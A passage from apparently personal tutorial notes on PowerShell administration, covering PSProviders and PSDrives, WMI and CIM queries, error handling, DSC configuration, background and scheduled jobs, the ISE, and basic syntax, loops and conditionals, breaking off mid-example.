```
##### Certificate
- **Description**: Provides access to X.509 certificates in the certificate store.
- **Drive**: `Cert:`
- **Example Usage**:
```powershell
Get-ChildItem -Path Cert:\CurrentUser\My
```
##### Alias
- **Description**: Exposes the aliases in the current PowerShell session.
- **Drive**: `Alias:`
- **Example Usage**:
```powershell
Get-ChildItem -Path Alias:
```
##### WSMan
- **Description**: Provides access to WS-Management configuration settings.
- **Drive**: `WSMan:`
- **Example Usage**:
```powershell
Get-ChildItem -Path WSMan:
```
### List Available PSProviders
To see all available PSProviders on your system, use the `Get-PSProvider` cmdlet:
```powershell
Get-PSProvider
```
### Output Example of `Get-PSProvider`

|Name|Capabilities|Drives|
|---|---|---|
|Alias|ShouldProcess|Alias:|
|Environment|ShouldProcess|Env:|
|FileSystem|Filter, ShouldProcess|C:, D:, E:|
|Function|ShouldProcess|Function:|
|Registry|ShouldProcess|HKLM:, HKCU:|
|Variable|ShouldProcess|Variable:|
|WSMan|Credentials, ShouldProcess|WSMan:|

### Using a PSProvider
Each PSProvider maps to one or more "drives," and you can interact with these drives just like file system drives.
#### Example: Navigating the Registry
```powershell
Set-Location -Path HKCU:\Software
Get-ChildItem
```
Example: Working with Certificates
```powershell
Set-Location -Path Cert:\CurrentUser\My
Get-ChildItem
```
Example: Accessing Environment Variables
```powershell
Get-ChildItem -Path Env:
$Env:Path # Display the PATH environment variable
```
### Custom PSProviders
Developers can create custom PSProviders for specialized data sources, enabling unique data interactions tailored to specific needs.
PowerShell’s PSProviders offer a unified way to work with different data sources, significantly simplifying administrative tasks and enabling consistent scripting.
## PSDrives in Powershell
**PSDrives** in PowerShell represent logical drives that provide access to various data stores, such as the file system, registry, environment variables, and more. They act as a bridge between **PSProviders** (which define how to interact with a type of data store) and actual data locations.
### Key Features of PSDrives
- A PSDrive can represent the file system, registry hives, certificate stores, and more.
- You can use common cmdlets like `Get-Item`, `Set-Item`, and `Remove-Item` to interact with the data in these drives.
- Custom PSDrives can be created to provide access to specific locations in a data store.
### Viewing Available PSDrives
To see all PSDrives available in your session, use the `Get-PSDrive` cmdlet:
```powershell
Get-PSDrive
```
### Example Output of `Get-PSDrive`:

|Name|Provider|Root|CurrentLocation|
|---|---|---|---|
|C|FileSystem|C:\|Users\John|
|D|FileSystem|D:\||
|Env|Environment|||
|HKLM|Registry|HKEY_LOCAL_MACHINE||
|Cert|Certificate||CurrentUser\My|

### Common PSDrives
Here are some default PSDrives and what they represent:

|**Drive**|**Provider**|**Description**|
|---|---|---|
|`C:`, `D:`|FileSystem|Access the file system on your local drives.|
|`HKLM`|Registry|Access the HKEY_LOCAL_MACHINE registry hive.|
|`HKCU`|Registry|Access the HKEY_CURRENT_USER registry hive.|
|`Env`|Environment|Access environment variables.|
|`Cert`|Certificate|Access X.509 certificates in the certificate store.|
|`Function`|Function|Access PowerShell functions defined in the current session.|
|`Variable`|Variable|Access variables in the current session.|
|`WSMan`|WSMan|Access WS-Management (Windows Remote Management) configuration.|

### Interacting with PSDrives
#### 1. Navigating a PSDrive
You can navigate into a PSDrive just like you would a file system drive:
```powershell
Set-Location C:\
Get-ChildItem
```
To navigate a non-filesystem PSDrive, specify its name followed by a colon (`:`):
```powershell
Set-Location HKCU:\Software
Get-ChildItem
```
#### 2. Access Environment Variables
The `Env:` drive allows you to interact with environment variables:
```powershell
Get-ChildItem Env:
$Env:Path # Access a specific environment variable
```
#### 3. Explore the Certificate Store
The `Cert:` drive gives access to certificates:
```powershell
Get-ChildItem Cert:\CurrentUser\My
```
### Creating a New PSDrive
You can create your own PSDrive to access a specific location in a provider using the `New-PSDrive` cmdlet.
#### Syntax:
```powershell
New-PSDrive -Name <DriveName> -PSProvider <ProviderName> -Root <Path> [-Persist]
```
Example: Create a PSDrive for a File System Folder
```powershell
New-PSDrive -Name "MyData" -PSProvider FileSystem -Root "C:\Data"
Set-Location MyData:
Get-ChildItem
```
Example: Create a PSDrive for a Specific Registry Path
```powershell
New-PSDrive -Name "AppSettings" -PSProvider Registry -Root "HKCU:\Software\MyApp"
Set-Location AppSettings:
```
Example: Create a Persistent Network Drive
```powershell
New-PSDrive -Name "Shared" -PSProvider FileSystem -Root "\\Server\Shared" -Persist -Credential (Get-Credential)
```
### Removing a PSDrive
To remove a custom PSDrive, use the `Remove-PSDrive` cmdlet:
```powershell
Remove-PSDrive -Name MyData
```
### Default vs Custom PSDrives
- **Default PSDrives**: Automatically created for each session (e.g., `C:`, `HKCU`, `Env`).
- **Custom PSDrives**: Manually created using `New-PSDrive` for specific paths or custom needs.
### Listing Drives for a Specific PSProvider
To list all PSDrives for a specific PSProvider, filter the output of `Get-PSDrive`:
```powershell
Get-PSDrive | Where-Object { $_.Provider -eq "Registry" }
```
### Practical Applications
1. **Organize Data Access**:
    - Map frequently accessed paths (e.g., `\\Server\Shared`) to a custom PSDrive for convenience.
2. **Registry Management**:
    - Use the `HKLM` and `HKCU` drives to automate registry edits.
3. **Environment Audits**:
    - Access and modify environment variables via the `Env:` drive.

## WMI and CIM in PowerShell
Windows Management Instrumentation (WMI) and Common Information Model (CIM) are technologies for managing and monitoring Windows systems. PowerShell provides cmdlets to interact with WMI and CIM, allowing you to query, retrieve, and manipulate system information.
### What are WMI and CIM?
#### WMI (Windows Management Instrumentation)
- A Microsoft implementation of the **Common Information Model (CIM)**.
- Provides a standardized way to access management information about Windows systems (e.g., hardware, software, services).
- WMI has been used traditionally for system administration tasks in Windows.
#### CIM (Common Information Model)
- An industry standard defined by the Distributed Management Task Force (DMTF).
- CIM is a cross-platform standard, making it more versatile than WMI.
- Introduced to PowerShell in version 3.0 for enhanced functionality, especially in remote scenarios.

### WMI vs CIM in PowerShell

|**Feature**|**WMI**|**CIM**|
|---|---|---|
|**Cmdlets**|`Get-WmiObject`, `Set-WmiInstance`|`Get-CimInstance`, `New-CimInstance`|
|**Protocol**|DCOM (older, Windows-only)|WSMan (modern, cross-platform)|
|**Performance**|Slower in remote scenarios|Faster and more reliable|
|**Security**|Relies on older protocols|Leverages WSMan and HTTPS|
|**Cross-Platform**|Windows-only|Cross-platform compatible|
|**Recommended Usage**|Legacy systems or scripts|Modern PowerShell scripts|

### PowerShell Cmdlets
#### WMI Cmdlets:
1. `Get-WmiObject`: Queries WMI objects.
2. `Set-WmiInstance`: Modifies WMI objects.
3. `Invoke-WmiMethod`: Executes methods on WMI objects.
4. `Remove-WmiObject`: Deletes WMI objects.
#### CIM Cmdlets:
1. `Get-CimInstance`: Queries CIM instances.
2. `New-CimInstance`: Creates new CIM instances.
3. `Set-CimInstance`: Modifies existing CIM instances.
4. `Invoke-CimMethod`: Executes methods on CIM instances.
5. `Remove-CimInstance`: Deletes CIM instances.

### Examples of WMI and CIM in Action
#### 1. Retrieve System Information
- **Using WMI:**
```powershell
Get-WmiObject -Class Win32_OperatingSystem
```
Using CIM:
```powershell
Get-CimInstance -ClassName Win32_OperatingSystem
```
#### 2. Query Processes
- **Using WMI:**
```powershell
Get-WmiObject -Class Win32_Process
```
**Using CIM:**
```powershell
Get-CimInstance -ClassName Win32_Process
```
#### 3. Restart a Service
- **Using WMI:**
```powershell
$Service = Get-WmiObject -Class Win32_Service -Filter "Name='wuauserv'"
$Service.StopService()
$Service.StartService()
```
Using CIM:
```powershell
Invoke-CimMethod -ClassName Win32_Service -MethodName StopService -Arguments @{Name='wuauserv'}
Invoke-CimMethod -ClassName Win32_Service -MethodName StartService -Arguments @{Name='wuauserv'}
```
#### 4. Query Remote Systems
- **Using WMI (DCOM-based):**
```powershell
 Get-WmiObject -Class Win32_ComputerSystem -ComputerName "RemotePC" -Credential (Get-Credential)
```
**Using CIM (WSMan-based):**
```powershell
Get-CimInstance -ClassName Win32_ComputerSystem -ComputerName "RemotePC" -Credential (Get-Credential)
```
#### 5. Get Disk Information
- **Using WMI:**
```powershell
Get-WmiObject -Class Win32_LogicalDisk
```
**Using CIM:**
```powershell
Get-CimInstance -ClassName Win32_LogicalDisk
```
#### 6. Create a CIM Session
CIM sessions are similar to PowerShell remoting sessions but are specific to CIM.
```powershell
# Create a CIM session
$Session = New-CimSession -ComputerName "RemotePC"

# Query using the CIM session
Get-CimInstance -ClassName Win32_OperatingSystem -CimSession $Session

# Remove the session
Remove-CimSession -CimSession $Session
```
### Best Practices
1. **Prefer CIM for New Scripts**:
    - CIM is more secure, modern, and cross-platform.
2. **Use CIM Sessions**:
    - If making multiple queries to a remote system, use a `CimSession` for efficiency.
3. **Backward Compatibility**:
    - Use WMI cmdlets only when working with legacy systems or older versions of PowerShell (prior to 3.0).
4. **Error Handling**:
    - Always handle exceptions, especially for remote queries.
```powershell
try {
    Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName "RemotePC"
} catch {
    Write-Error "Failed to query the remote system: $_"
}
```
### WMI and CIM Namespaces
Namespaces organize the classes in WMI/CIM. Common namespaces include:

| **Namespace**         | **Description**                          |
| --------------------- | ---------------------------------------- |
| `root\cimv2`          | General system information.              |
| `root\default`        | Default namespace for basic queries.     |
| `root\wmi`            | Hardware-related information.            |
| `root\virtualization` | Virtualization and Hyper-V related info. |

### Listing Available WMI Classes
To list all classes in a specific namespace:
```powershell
Get-WmiObject -Namespace "root\cimv2" -List
```
Or with CIM:
```powershell
Get-CimClass -Namespace "root\cimv2"
```
## Error Handling in Powershell
Error handling in PowerShell is essential for creating robust and reliable scripts. PowerShell provides various mechanisms to handle, capture, and respond to errors effectively.
### Types of Errors
1. **Terminating Errors**:
    - These are severe errors that stop the script execution immediately.
    - Example: Missing mandatory parameters, unreachable remote connections.
2. **Non-Terminating Errors**:
    - These are warnings or recoverable errors that do not stop script execution.
    - Example: File not found in a directory listing.
### Error Action Preferences
- **`$ErrorActionPreference`** controls how PowerShell handles non-terminating errors.
- Possible values:
    - `Continue` (default): Displays the error and continues execution.
    - `Stop`: Treats non-terminating errors as terminating errors.
    - `SilentlyContinue`: Suppresses error messages and continues execution.
    - `Inquire`: Prompts for user input when an error occurs.
    - `Ignore`: Suppresses errors without adding them to the error record.
Example:
```powershell
$ErrorActionPreference = "Stop"
```
### Cmdlet-Specific Error Handling
Use the `-ErrorAction` parameter to control error behavior for specific cmdlets.
Example:
```powershell
# Suppress errors for a specific command
Get-ChildItem -Path "C:\NonExistentFolder" -ErrorAction SilentlyContinue
```
### Try, Catch, and Finally Blocks
PowerShell supports structured error handling using `Try`, `Catch`, and `Finally` blocks.
#### Syntax:
```powershell
Try {
    # Code that may cause an error
}
Catch {
    # Code to handle the error
}
Finally {
    # Code that runs regardless of whether an error occurred
}
```
Example:
```powershell
Try {
    Get-Content -Path "C:\NonExistentFile.txt"
} Catch {
    Write-Host "An error occurred: $_"
} Finally {
    Write-Host "Execution completed."
}
```
### Accessing Error Details
- **`$_`**: The current error object in a `Catch` block.
- **`$Error`**: A global array storing recent error objects.
- **`$?`**: Indicates whether the last command was successful (`True`/`False`).
Example:
```powershell
Try {
    Get-Content -Path "C:\NonExistentFile.txt"
} Catch {
    Write-Host "Error Message: $($_.Exception.Message)"
    Write-Host "Error Type: $($_.Exception.GetType().FullName)"
}
```
### Error Handling with Specific Exceptions
You can catch specific error types by specifying them in the `Catch` block.
Example:
```powershell
Try {
    [int]$Value = "NotANumber"
} Catch [System.Management.Automation.RuntimeException] {
    Write-Host "Runtime exception occurred: $($_.Exception.Message)"
} Catch [Exception] {
    Write-Host "General exception occurred: $($_.Exception.Message)"
}
```
### Using the `Throw` Statement
The `Throw` statement generates a terminating error.
Example:
```powershell
Function Test-Input {
    Param ($Value)
    If (-not $Value) {
        Throw "Value cannot be null or empty!"
    }
    Write-Host "Value is valid: $Value"
}

Try {
    Test-Input -Value $null
} Catch {
    Write-Host "Caught an error: $_"
}
```
### Using `$ErrorVariable`
The `-ErrorVariable` parameter allows capturing errors into a custom variable.
Example:
```powershell
Get-Content -Path "C:\NonExistentFile.txt" -ErrorVariable MyError
If ($MyError) {
    Write-Host "An error occurred: $($MyError[0].Exception.Message)"
}
```
### Trap Statement
The `Trap` statement is a legacy error-handling method, but it is less commonly used in modern PowerShell scripts.
Example:
```powershell
Trap {
    Write-Host "An error occurred: $($_.Exception.Message)"
    Continue
}

Get-Content -Path "C:\NonExistentFile.txt"
```
### Common Scenarios for Error Handling
#### 1. Handle Missing Files
```powershell
Try {
    Get-Content -Path "C:\NonExistentFile.txt"
} Catch {
    Write-Warning "File not found: $($_.Exception.Message)"
}
```
2. Retry Logic
```powershell
$RetryCount = 0
$MaxRetries = 3

Do {
    Try {
        # Simulate an operation
        Get-Content -Path "C:\NonExistentFile.txt"
        $Success = $true
    } Catch {
        $RetryCount++
        Write-Warning "Attempt $RetryCount failed. Retrying..."
        Start-Sleep -Seconds 2
    }
} While (-not $Success -and $RetryCount -lt $MaxRetries)

If (-not $Success) {
    Write-Error "Operation failed after $MaxRetries attempts."
}
```
3. Log Errors to a File
```powershell
Try {
    Get-Content -Path "C:\NonExistentFile.txt"
} Catch {
    $ErrorMessage = "Error: $($_.Exception.Message)`n"
    $ErrorMessage | Out-File -FilePath "C:\ErrorLog.txt" -Append
}
```
### Best Practices
1. **Be Specific in `Catch` Blocks**:
    - Catch only the exceptions you expect and can handle.
2. **Use `$ErrorActionPreference` Judiciously**:
    - Avoid setting `Stop` globally unless necessary.
3. **Log Errors**:
    - Always log critical errors for troubleshooting.
4. **Fail Gracefully**:
    - Provide meaningful messages when errors occur to ensure the user understands the issue.
5. **Test Error Scenarios**:
    - Simulate potential error conditions during script development.

## Configuration Management with Powershell
Configuration management with PowerShell involves using PowerShell's automation capabilities to manage, configure, and maintain the state of IT systems. The most advanced tool in PowerShell for configuration management is **Desired State Configuration (DSC)**, but PowerShell can also handle ad-hoc and script-based configuration tasks.
### Core Concepts
```
1. **Scripts for Configuration Management:**
    - Use PowerShell scripts to configure systems, install software, manage settings, and enforce policies.
2. **Desired State Configuration (DSC):**
    - A declarative platform in PowerShell for ensuring systems meet desired configuration states.
    - Defines infrastructure as code using configurations and resources.
3. **Automation and Scalability:**
    - Automate repetitive tasks to ensure consistency and reduce manual errors.
    - Scale configurations across multiple systems using remoting or orchestration tools.
### Approaches to Configuration Management
#### 1. Ad-Hoc Configuration with PowerShell
- Execute commands or scripts on-demand to configure systems.
Example:
```powershell
# Install a Windows Feature
Install-WindowsFeature -Name Web-Server
```
#### 2. Script-Based Configuration
- Create reusable PowerShell scripts to standardize configurations across systems.
Example:
```powershell
# PowerShell Script to Set a Static IP
$Interface = Get-NetAdapter -Name "Ethernet"
New-NetIPAddress -InterfaceIndex $Interface.InterfaceIndex -IPAddress "192.168.1.100" -PrefixLength 24 -DefaultGateway "192.168.1.1"
Set-DnsClientServerAddress -InterfaceIndex $Interface.InterfaceIndex -ServerAddresses "8.8.8.8"
```
#### 3. Using Desired State Configuration (DSC)
- Define configurations as code to automate enforcement of desired states.
Example:
```powershell
Configuration WebServerConfig {
    Node "Server01" {
        WindowsFeature WebServer {
            Name = "Web-Server"
            Ensure = "Present"
        }

        File WebsiteFiles {
            Ensure = "Present"
            Type = "Directory"
            DestinationPath = "C:\inetpub\wwwroot\Website"
            SourcePath = "\\Share\WebsiteFiles"
        }
    }
}
WebServerConfig
```
Compile the script into a MOF file and apply it:
```powershell
Start-DscConfiguration -Path ./WebServerConfig -Wait -Verbose
```
### PowerShell Tools for Configuration Management
1. **PowerShell Remoting:**
    - Manage remote systems using commands like `Invoke-Command` or sessions with `Enter-PSSession`.
    Example:
```powershell
Invoke-Command -ComputerName "Server01" -ScriptBlock { Install-WindowsFeature -Name Web-Server }
```
**Modules and Packages:**
- Use modules and scripts from the PowerShell Gallery to enhance configuration tasks.
- Install modules:
```powershell
Install-Module -Name Az -Scope CurrentUser
```
**Configuration Reporting:**
- Use PowerShell to query system states and generate reports.
Example:
```powershell
Get-WindowsFeature | Where-Object Installed
```
**Integration with DevOps Tools:**
- Combine PowerShell with tools like Ansible, Chef, or Azure Automation for advanced configuration workflows.
### Examples
#### Scenario 1: Configure a Batch of Servers
Use a script to configure multiple servers:
```powershell
$Servers = @("Server01", "Server02", "Server03")
foreach ($Server in $Servers) {
    Invoke-Command -ComputerName $Server -ScriptBlock {
        Install-WindowsFeature -Name Web-Server
        Restart-Computer
    }
}
```
#### Scenario 2: Enforce Desired Configuration
Use DSC to ensure all web servers have a specific feature installed:
```powershell
Configuration WebFeatureConfig {
    Node ("Server01", "Server02") {
        WindowsFeature WebServer {
            Name = "Web-Server"
            Ensure = "Present"
        }
    }
}
WebFeatureConfig
Start-DscConfiguration -Path ./WebFeatureConfig -Wait -Verbose
```

## Background Jobs in PowerShell
Background jobs in PowerShell allow you to execute long-running or resource-intensive tasks asynchronously. This means the script can continue executing other commands while the job runs in the background.
### Key Cmdlets for Background Jobs

|**Cmdlet**|**Description**|
|---|---|
|`Start-Job`|Starts a background job.|
|`Get-Job`|Lists all running or completed jobs.|
|`Receive-Job`|Retrieves the output from a job.|
|`Remove-Job`|Removes a job from the job queue.|
|`Stop-Job`|Stops a running job.|
|`Wait-Job`|Waits for a job to complete before proceeding.|
|`Invoke-Command -AsJob`|Runs a script block or command as a background job.|

### 1. Starting a Background Job
#### 1.1 Using `Start-Job`
```powershell
# Start a job
$Job = Start-Job -ScriptBlock {
    Start-Sleep -Seconds 10
    Get-Process
}

# Check the job status
Get-Job
```
1.2 Example with Parameters
```powershell
$Job = Start-Job -ScriptBlock {
    param($Path)
    Get-ChildItem -Path $Path
} -ArgumentList "C:\"
```
### 2. Monitoring Background Jobs
#### 2.1 Check Job Status
```powershell
Get-Job
```
2.2 Wait for Job Completion
```powershell
Wait-Job -Id $Job.Id
```
2.3 Stop a Running Job
```powershell
Stop-Job -Id $Job.Id
```
### 3. Retrieving Job Results
#### 3.1 Get Output from a Job
Once the job completes, you can retrieve its output using `Receive-Job`.
```powershell
$Result = Receive-Job -Id $Job.Id
Write-Output $Result
```
#### 3.2 Retrieve Output Without Removing Job
By default, `Receive-Job` clears the job output after retrieval. To preserve the output, use the `-Keep` parameter:
```powershell
Receive-Job -Id $Job.Id -Keep
```
### 4. Removing Background Jobs
To clean up completed jobs, use `Remove-Job`.
```powershell
Remove-Job -Id $Job.Id
```
### 5. Running Remote Jobs
You can use `Invoke-Command` with the `-AsJob` parameter to run a background job on a remote system.
#### Example: Run a Remote Job
```powershell
Invoke-Command -ComputerName "RemotePC" -ScriptBlock { Get-Service } -AsJob
```
Example: Retrieve Remote Job Results
```powershell
# Get jobs from the remote session
Get-Job

# Retrieve job results
Receive-Job -Id 1
```
### 6. Nested Jobs
Jobs can also be nested. However, this can lead to complexity in managing job results and monitoring.
#### Example: Start a Job Within Another Job
```powershell
Start-Job -ScriptBlock {
    Start-Job -ScriptBlock {
        Start-Sleep -Seconds 5
        "Nested job completed"
    } | Wait-Job | Receive-Job
}
```
### 7. Tracking Multiple Jobs
If you have multiple jobs running, you can monitor them collectively.
#### Example: Wait for All Jobs to Complete
```powershell
$Jobs = @(
    Start-Job -ScriptBlock { Start-Sleep -Seconds 5; "Job 1 completed" }
    Start-Job -ScriptBlock { Start-Sleep -Seconds 10; "Job 2 completed" }
)

# Wait for all jobs to complete
Wait-Job -Job $Jobs

# Retrieve results
$Jobs | ForEach-Object { Receive-Job -Job $_ }
```
### 8. Handling Errors in Jobs
Errors in jobs are captured in the `Error` stream. Use `Receive-Job` to retrieve them.
#### Example: Handle Job Errors
```powershell
$Job = Start-Job -ScriptBlock {
    Get-Item "C:\NonExistentFile.txt"
}

# Wait for job completion
Wait-Job -Id $Job.Id

# Retrieve errors
$JobError = Receive-Job -Id $Job.Id -ErrorAction SilentlyContinue
if ($JobError) {
    Write-Host "Job encountered errors."
}
```
### 9. Scheduled Jobs
For recurring tasks, you can use **scheduled jobs**, which are built on background jobs.
#### Install Scheduled Jobs Module
```powershell
Import-Module PSScheduledJob
```
Create a Scheduled Job
```powershell
Register-ScheduledJob -Name "DailyCleanup" -ScriptBlock {
    Remove-Item -Path "C:\Temp\*" -Recurse -Force
} -Trigger (New-JobTrigger -Daily -At 3AM)
```
View Scheduled Jobs
```powershell
Get-ScheduledJob
```
Remove a Scheduled Job
```powershell
Unregister-ScheduledJob -Name "DailyCleanup"
```
### 10. Best Practices
1. **Monitor Job Status**:
    - Always check the status of jobs with `Get-Job`.
2. **Clean Up Completed Jobs**:
    - Remove jobs you no longer need to avoid clutter.
3. **Use Unique Job Names**:
    - Assign unique names to jobs for easy identification.
4. **Log Job Output**:
    - Store results or logs for debugging or auditing purposes.
5. **Handle Errors Gracefully**:
    - Ensure proper error handling in job scripts.

### Sample Script: Automate Background Jobs
Here's an example of running multiple background jobs to process files in parallel:
```powershell
# Define file paths
$FilePaths = Get-ChildItem -Path "C:\Data" -Recurse | Select-Object -ExpandProperty FullName

# Start jobs
$Jobs = @()
foreach ($Path in $FilePaths) {
    $Jobs += Start-Job -ScriptBlock {
        param($FilePath)
        # Simulate processing
        Start-Sleep -Seconds 2
        Write-Output "Processed file: $FilePath"
    } -ArgumentList $Path
}

# Wait for all jobs to complete
Wait-Job -Job $Jobs

# Retrieve results
$Results = $Jobs | ForEach-Object { Receive-Job -Job $_ }
Write-Output $Results

# Clean up jobs
$Jobs | Remove-Job
```
## Scripting
Scripting involves writing and running a sequence of commands stored in a text file, called a script, to automate tasks that are typically performed manually in a shell environment, such as PowerShell.
In simple terms, scripting is like giving the computer a to-do list, where each line of the script represents a task that the computer executes automatically. This approach saves time, minimizes the risk of errors, and makes it possible to perform tasks that are too complex or tedious to handle manually. As you deepen your understanding of shells and scripting, you'll realize that scripts are powerful tools for system management, data processing, and a wide range of other applications.
### PowerShell Integrated Scripting Environment (ISE)
The **PowerShell Integrated Scripting Environment (ISE)** provides a graphical user interface for PowerShell scripting. It includes advanced tools for creating, editing, debugging, and running scripts, making it a valuable resource for both beginners and experienced users.
#### Key Features of PowerShell ISE:
- **Multiline Editing**: Easily work with scripts that span multiple lines.
- **Tab Completion**: Auto-complete cmdlets, parameters, and paths to save time and reduce errors.
- **Syntax Coloring**: Highlights keywords, strings, and variables for better readability.
- **Selective Execution**: Run specific lines or sections of code directly from the editor.
- **Context-Sensitive Help**: Access detailed documentation for cmdlets and parameters directly within the interface.
- **Breakpoints**: Right-click in the edit pane to set breakpoints for debugging scripts.
#### Menu Items and Shortcuts:
The ISE allows you to perform most console actions using a graphical menu or keyboard shortcuts. For example:
- **Setting Breakpoints**: Right-click a line of code in the editor pane and choose "Set Breakpoint" to pause execution at that line.
#### Benefits
- **Streamlined Workflows**: Consolidates script creation, testing, and debugging into one tool.
- **Increased Productivity**: Reduces the effort needed for repetitive tasks with its intuitive interface.
#### Launching PowerShell ISE:
To open the PowerShell ISE, type the following in the Start menu:
```powershell
powershell ise
```
Alternatively, you can run the following command in the PowerShell console:
```powershell
ise
```
The PowerShell ISE is an essential tool for anyone working with scripts, offering a balance of simplicity and advanced functionality.
![[Notes Cataloge/IT & System Admin Notes/Powershell/1.png]]
The PowerShell Integrated Scripting Environment (ISE) includes a user-friendly interface with several key components to enhance the scripting experience:
#### Menu Bar
The **Menu Bar** provides drop-down menus with options for various tasks:
- **File**: Open, save, or create scripts.
- **Edit**: Cut, copy, paste, undo, and redo operations.
- **View**: Customize the interface layout, toggle panes, or adjust settings.
- **Tools**: Configure options or run integrated tools.
- **Debug**: Add breakpoints, step through scripts, and inspect variables.
- **Add-ons**: Manage additional tools and modules.
- **Help**: Access built-in PowerShell documentation and guides.
#### Toolbar
The **Toolbar**, located below the Menu Bar, provides quick access buttons for common actions:
- **Copy, Cut, Paste**: Clipboard operations.
- **Run Script**: Execute the current script.
- **Run Selection**: Execute only the highlighted section of code.
- **Stop Operation**: Terminate a running script.
#### Scripting Tab
The **Scripting Tabs** beneath the Toolbar allow you to work on multiple scripts simultaneously.
- Each tab is a workspace for writing and running scripts.
- Hover over a tab to see the full file path of the script displayed in a tooltip.
#### Status Bar
Located at the bottom of the interface, the **Status Bar** displays:
- The completion status of commands and scripts.
- Any error messages or warnings generated during execution.
#### Commands Pane
On the right side of the ISE window, the **Commands Pane** lists all available cmdlets and their parameters.
- You can search and execute commands directly from this pane.
- It's a handy resource for discovering cmdlets and learning their usage.
#### Text-Size Slide
At the bottom-right corner of the screen is a **Text-Size Slider** for adjusting the size of the text:
- Slide to the right to increase text size.
- Slide to the left to decrease text size.

These features make PowerShell ISE a comprehensive tool for developing, testing, and debugging scripts efficiently.
### Basics of Writing Powershell Scripts
#### Comments
Including comments in your scripts is a best practice to enhance readability and help others (or your future self) understand the purpose and functionality of the code.
##### Single-Line Comments
- A **single-line comment** starts with a `#`.
- Everything after the `#` on the same line is ignored by PowerShell.
**Example:**
```powershell
# This is a single-line comment explaining the command below
Write-Output "Hello, World!"
```
##### Block Comments
- A **block comment** starts with `<#` and ends with `#>`.
- It can span multiple lines, making it useful for larger explanations or documentation.
**Example:**
```powershell
<#
This is a block comment.
It can span multiple lines.
Use it for detailed explanations or documentation.
#>
Write-Output "Block comments are handy!"
```
#### Brackets, parentheses and braces
PowerShell uses a variety of delimiters to structure code and perform different operations. Below are some of the most commonly used delimiters and their purposes:
##### Parentheses `()` 
- **Purpose**:
    - Group expressions for evaluation.
    - Call methods or functions.
    - Define the order of operations.
**Examples**
```powershell
# Grouping expressions
$result = (2 + 3) * 4  # Output: 20

# Calling a method
"Hello".ToUpper()  # Output: HELLO
```
##### Brackets `[]`
- **Purpose**:
    - Access elements in an array or collection.
    - Specify types or generic arguments.
**Examples**:
```powershell
# Accessing array elements
$array = @(1, 2, 3)
$secondElement = $array[1]  # Output: 2

# Specifying types
[int]$number = 42  # Enforces integer type
```
#### Curly Braces `{}`
- **Purpose**:
    - Define script blocks, loops, or conditionals.
    - Enclose blocks of code.
**Examples**:
```powershell
# Script block
$scriptBlock = { Write-Output "Hello, World!" }
& $scriptBlock  # Output: Hello, World!

# Loop with curly braces
foreach ($item in @(1, 2, 3)) {
    Write-Output $item
}
```
#####  Comma `,`
- **Purpose**:
    - Define elements in an array or separate arguments.
**Examples**:
```powershell
# Array definition
$array = 1, 2, 3  # Creates an array with 3 elements

# Separate arguments
Write-Output 1, "Hello", $true  # Outputs: 1 Hello True
```
#### Semicolon `;`
- **Purpose**:
    - Separate multiple statements on the same line.
**Example**:
```powershell
Write-Output "First Statement"; Write-Output "Second Statement"
```
#### Pipe `|`
- **Purpose**:
    - Pass output from one cmdlet to another.
**Example**:
```powershell
Get-Process | Where-Object {$_.CPU -gt 100}
```
#### Backtick <code>`</code>
- **Purpose**:
    - Escape characters or continue a command on the next line.
**Examples**:
```powershell
# Line continuation
Write-Output "This is a long line `  
that continues on the next line."

# Escape characters
Write-Output "This is a backtick: ``"
```
#### Double Quotation Marks `"`
- **Purpose**:
    - Define strings with variable interpolation.
**Example**:
```powershell
$name = "Alice"
Write-Output "Hello, $name"  # Output: Hello, Alice
```
#### Single Quotation Marks `'`
- **Purpose**:
    - Define strings without variable interpolation.
**Example**:
```powershell
$name = "Alice"
Write-Output 'Hello, $name'  # Output: Hello, $name
```
#### Dollar Sign `$`
- **Purpose**:
    - Declare variables or access their values.
**Example**:
```powershell
$greeting = "Hello"
Write-Output $greeting  # Output: Hello
```
### Loops
Loops in PowerShell allow you to repeat a block of code multiple times. Here are the most frequently used loop types, along with examples:
#### `For` Loop
Executes a block of code a specific number of times.
**Syntax:**
```powershell
for (<initialization>; <condition>; <increment/decrement>) {
    <code to execute>
}
```
Example:
```powershell
# Print numbers from 1 to 5
for ($i = 1; $i -le 5; $i++) {
    Write-Output $i
}
```
#### `Foreach` Loop
Iterates over each element in a collection.
**Syntax:**
```powershell
foreach (<item> in <collection>) {
    <code to execute>
}
```
Example:
```powershell
# Print each fruit in the array
$fruits = @("Apple", "Banana", "Cherry")
foreach ($fruit in $fruits) {
    Write-Output $fruit
}
```
#### `While` Loop
Repeats a block of code as long as the condition evaluates to `true`.
**Syntax:**
```powershell
while (<condition>) {
    <code to execute>
}
```
Example:
```powershell
# Print numbers from 1 to 5
$i = 1
while ($i -le 5) {
    Write-Output $i
    $i++
}
```
#### `Do-While` Loop
Executes a block of code **at least once**, and then continues to execute as long as the condition is `true`.
**Syntax:**
```powershell
do {
    <code to execute>
} while (<condition>)
```
Example:
```powershell
# Print numbers from 1 to 5
$i = 1
do {
    Write-Output $i
    $i++
} while ($i -le 5)
```
####  `Do-Until` Loop
Executes a block of code **at least once**, and then continues until the condition becomes `true`.
**Syntax:**
```powershell
do {
    <code to execute>
} until (<condition>)
```
Example:
```powershell
# Print numbers from 1 to 5
$i = 1
do {
    Write-Output $i
    $i++
} until ($i -gt 5)
```
####  `Foreach-Object` Loop
Processes each item in a collection within a pipeline.
**Syntax:**
```powershell
<collection> | ForEach-Object {
    <code to execute>
}
```
Example:
```powershell
# Print each fruit in the array
@("Apple", "Banana", "Cherry") | ForEach-Object {
    Write-Output $_
}
```
#### Choosing the Right Loop
- Use **`For`** when the number of iterations is known beforehand.
- Use **`Foreach`** to iterate over elements in a collection.
- Use **`While`** for conditional looping with an unknown number of iterations.
- Use **`Do-While`** or **`Do-Until`** when the loop needs to execute at least once.
- Use **`Foreach-Object`** for concise operations within a pipeline.

### Conditions in Powershell
Conditional statements are used to control the execution flow of a script based on specific conditions. Below are examples of common conditional constructs in PowerShell.
#### `If` Statement
Executes a block of code **only if** the specified condition is `true`.
**Syntax:**
```powershell
if (<condition>) {
    <code to execute>
}
```
Example:
```powershell
# Check if a number is greater than 10
$number = 15
if ($number -gt 10) {
    Write-Output "The number is greater than 10."
}
```
#### `If-Else` Statement
Adds an `else` block to execute code **when the condition is `false`.**
**Syntax:**
```powershell
if (<condition>) {
    <code to execute if condition is true>
} else {
    <code to execute if condition is false>
}
```
Example:
```powershell
# Check if a number is positive or negative
$number = -5
if ($number -ge 0) {
    Write-Output "The number is positive."
